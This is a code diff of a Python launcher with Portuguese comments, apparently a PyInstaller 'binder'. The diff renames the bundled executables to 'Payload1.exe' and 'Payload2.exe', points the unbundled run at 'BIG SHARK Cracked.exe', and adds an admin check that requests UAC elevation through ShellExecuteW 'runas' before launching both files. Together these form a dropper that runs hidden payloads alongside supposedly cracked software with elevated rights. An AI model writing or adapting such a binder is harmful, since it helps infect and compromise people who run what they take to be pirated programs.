@@ -2,7 +2,13 @@ import os
 import sys
 import subprocess
 import threading
-import tempfile
+import ctypes
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
 def abrir_executavel(arquivo):
     try:
@@ -17,11 +23,11 @@ def abrir_dois_executaveis():
         # Verificar se o código está rodando a partir do binário do PyInstaller
         if getattr(sys, '_MEIPASS', False):
             # Quando o script é executado a partir do binário compilado com PyInstaller
-            arquivo1 = os.path.join(sys._MEIPASS, 'AnyDesk.exe')
-            arquivo2 = os.path.join(sys._MEIPASS, 'Microsoft Edge.exe')
+            arquivo1 = os.path.join(sys._MEIPASS, 'Payload1.exe')
+            arquivo2 = os.path.join(sys._MEIPASS, 'Payload2.exe')
         else:
             # Quando o script está rodando diretamente (não compilado)
-            arquivo1 = 'AnyDesk.exe'
+            arquivo1 = 'BIG SHARK Cracked.exe'
             arquivo2 = 'Microsoft Edge.exe'
 
         # Verificar se os arquivos existem
@@ -50,4 +56,8 @@ def abrir_dois_executaveis():
         print(f"Erro ao tentar abrir os executáveis: {e}")
 
 if __name__ == '__main__':
-    abrir_dois_executaveis()
+    if is_admin():
+        abrir_dois_executaveis()
+    else:
+        # Solicitar elevação
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
